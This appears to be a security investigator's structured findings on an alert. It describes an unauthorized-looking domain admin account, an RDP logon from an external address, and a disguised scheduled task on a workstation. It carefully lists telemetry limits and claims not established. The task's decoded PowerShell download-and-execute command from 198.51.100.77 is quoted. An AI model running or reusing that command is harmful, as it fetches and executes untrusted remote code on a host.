system: You are a security investigator reviewing an alert. Base every claim only on the evidence available to you. Cite the record IDs that support each observation.

supporting_observations.claim: On DC-LV-01, the account support_tmp was created by kim.ortega at 13:42:23 UTC, then added to the domain Administrators group four seconds later.
The account name and administrator-group membership conflict with the stated practice that temporary accounts use the temp.<name> format and never receive administrator rights.
WS-RIYER-01 accepted a Remote Desktop logon for kim.ortega from 198.51.100.77; the DC also recorded a service ticket for kim.ortega to WS-RIYER-01 from that address.
A task named Microsoft\Windows\SyncCheck was registered on WS-RIYER-01 under kim.ortega. Its hidden PowerShell action uses an encoded command that decodes to `IEX (iwr http://198.51.100.77/s.ps1)`.

The remote logon and task registration are inconsistent with the stated administration practice: remote administration is only from WS-KORTEGA-01 inside the office, and the task's encoded command downloads and executes a script from an address also seen as the RDP source.

The account-creation events use SubjectLogonId 0x8330a81, while the RDP session and task registration use 0x6978b4e; the supplied records do not establish that the account was created in that RDP session.

known_telemetry_limitations: The records show the account creation and group addition on the domain controller but do not identify the originating host or map SubjectLogonId 0x8330a81 to a logon event in the supplied evidence.
The task registration is recorded, but the supplied records do not show whether the task ran or what the remote script contained.
The supplied records do not show a network connection to 198.51.100.77 associated with the task.
claims_not_established: Whether kim.ortega's credentials or account were compromised, or whether the recorded activity was performed by kim.ortega.
Whether support_tmp was used after creation or what access it obtained beyond the recorded Administrators-group membership.
Whether the PowerShell task executed successfully or what changes its downloaded script made.
Whether the account creation or task had an authorized exception not represented in the supplied change calendar and inventory.
additional_evidence_needed: Correlate DC-LV-01 logon and account-management auditing for SubjectLogonId 0x8330a81, including originating host, authentication details, and related events.
Collect WS-RIYER-01 task scheduler operational logs, task execution history, PowerShell logs, and process/network telemetry around and after 13:42 UTC.
Review firewall, proxy, and endpoint telemetry for connections to 198.51.100.77 and retrieve the referenced script if available.
Verify with the IT administrator and change/request records whether the account, group addition, remote logon, or task was authorized; preserve relevant systems and logs during investigation.
